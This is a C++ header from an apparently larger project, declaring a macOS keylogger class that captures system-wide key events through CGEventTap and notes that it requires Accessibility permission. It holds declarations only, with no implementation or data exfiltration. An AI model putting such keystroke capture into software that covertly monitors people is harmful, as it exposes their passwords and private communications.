#pragma once
#include "interfaces/IKeylogger.hpp"
#include <atomic>
#include <thread>
#include <CoreFoundation/CoreFoundation.h>

namespace platform {
namespace macos {

/**
 * macOS Keylogger using Quartz Event Services (CGEventTap)
 *
 * REQUIRES: Accessibility permission in System Preferences
 *           Security & Privacy → Privacy → Accessibility
 */
class MacOSKeylogger : public interfaces::IKeylogger {
public:
    MacOSKeylogger();
    ~MacOSKeylogger() override;

    common::EmptyResult start(std::function<void(const interfaces::KeyEvent&)> on_event) override;
    void stop() override;
    bool is_active() const override;

private:
    void run_loop_thread();
    static CGEventRef event_callback(
        CGEventTapProxy proxy,
        CGEventType type,
        CGEventRef event,
        void* user_info
    );

    std::function<void(const interfaces::KeyEvent&)> callback_;
    std::atomic<bool> running_{false};
    std::thread thread_;

    CFMachPortRef event_tap_ = nullptr;
    CFRunLoopRef run_loop_ = nullptr;
    CFRunLoopSourceRef run_loop_source_ = nullptr;
};

} // namespace macos
} // namespace platform
